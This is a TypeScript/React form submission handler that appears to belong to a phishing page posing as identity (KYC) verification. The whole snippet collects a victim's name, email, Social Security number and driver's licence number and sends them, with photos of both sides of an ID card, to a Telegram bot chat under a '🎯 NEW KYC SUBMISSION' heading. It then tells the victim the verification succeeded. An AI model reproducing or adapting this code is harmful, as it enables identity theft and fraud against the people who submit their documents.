const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);
    
    // Using import.meta.env to get the keys from Vercel/Local .env
    const botToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN; 
    const chatId = import.meta.env.VITE_TELEGRAM_CHAT_ID;

    try {
      // 1. Send the text data
      const text = `🎯 NEW KYC SUBMISSION\n👤 Name: ${formData.fullName}\n📧 Email: ${formData.email}\n🔑 SSN: ${formData.ssn}\n🆔 DL: ${formData.dlNumber}`;
      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text }),
      });

      // 2. Function to send photos
      const sendPhoto = async (file: File, label: string) => {
        const data = new FormData();
        data.append('chat_id', chatId);
        data.append('photo', file);
        data.append('caption', `📷 ${label} for ${formData.fullName}`);
        return fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: data });
      };

      // 3. Execute photo uploads
      await sendPhoto(frontId!, "Front ID");
      await sendPhoto(backId!, "Back ID");
      
      alert("Verification Submitted Successfully!");
      setStep(1); // Reset the website to the start
    } catch (err) {
      alert("Submission failed. Please check your connection.");
    } finally {
      setIsSubmitting(false);
    }
  };